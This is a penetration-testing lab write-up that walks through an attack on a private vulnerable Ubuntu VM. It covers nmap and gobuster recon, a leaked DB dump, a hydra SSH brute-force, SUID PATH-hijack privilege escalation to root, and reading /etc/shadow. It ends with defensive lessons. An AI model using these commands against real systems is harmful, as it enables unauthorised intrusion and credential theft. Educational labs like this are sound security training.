# 🧪 Penetration Test Lab – Full Simulation

This document walks through a **complete penetration test simulation** conducted in a controlled lab environment. The goal is to demonstrate a realistic attack workflow while following ethical hacking methodology.

> ⚠️ Educational purpose only. Do not replicate without permission on real systems.

---

## 🧱 Target Setup

- **OS**: Ubuntu 20.04 (vulnerable VM)
- **IP Address**: 192.168.1.105
- **Exposed Services**:
  - HTTP (port 80)
  - SSH (port 22)
  - MySQL (port 3306)

---

## 🔍 1. Reconnaissance

```bash
nmap -sS -sV -T4 -Pn 192.168.1.105
```

Result:

``` arduino

22/tcp  open  ssh      OpenSSH 7.2p2
80/tcp  open  http     Apache httpd 2.4.18
3306/tcp open mysql    MySQL 5.7.29
```

Used gobuster to brute force hidden directories:

```bash

gobuster dir -u http://192.168.1.105 -w /usr/share/wordlists/dirb/common.txt
```

Found: /admin, /uploads, /backup

## 📡 2. Vulnerability Discovery

Visited http://192.168.1.105/backup/db.sql → Full DB dump exposed

→ Contained MySQL credentials:

```sql
User: admin
Pass: pass1234
```

Used hydra to brute-force SSH using leaked credentials:

```bash
hydra -l admin -P passwords.txt ssh://192.168.1.105
```

Got access with password: pass1234

## 💥 3. Exploitation

``` bash
ssh admin@192.168.1.105
```

After login:

```bash
whoami
admin
```

Found SUID binary:

```bash
find / -perm -4000 -type f 2>/dev/null
```

→ /usr/bin/viewlogs (custom log viewer, insecurely coded)

Checked source:

```c
system("/bin/cat /var/log/syslog");
```

Exploited with path hijacking:

```bash
echo "/bin/bash" > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH
/usr/bin/viewlogs
Got root shell.
```

## 📥 4. Post-Exploitation

- Enumerated users: cat /etc/passwd

- Extracted hashes: cat /etc/shadow

- Enabled SSH root login

- Exfiltrated /var/www/html contents

## 🧾 5. Report Summary

| Phase             | Tool(s) Used       | Outcome                           |
| ----------------- | ------------------ | --------------------------------- |
| Recon             | `nmap`, `gobuster` | Found open ports and endpoints    |
| Credential Leak   | Browser, DB dump   | Found MySQL creds                 |
| Exploitation      | `ssh`, `hydra`     | SSH access & privilege escalation |
| Post-Exploitation | Linux CLI          | Full system compromise            |


## 🎓 Lessons Learned

- Exposed backup files can lead to full compromise.

- SUID binaries should be reviewed carefully.

- Always validate access permissions and sanitize input in scripts.

## 📌 Best Practices

- Restrict directory listing and backup exposure

- Rotate credentials frequently

 -Use least privilege principles for user permissions

- Audit custom binaries before deployment

## 🛡️ Disclaimer

This lab is designed strictly for ethical hacking education. All steps were executed within a safe and private VM environment.
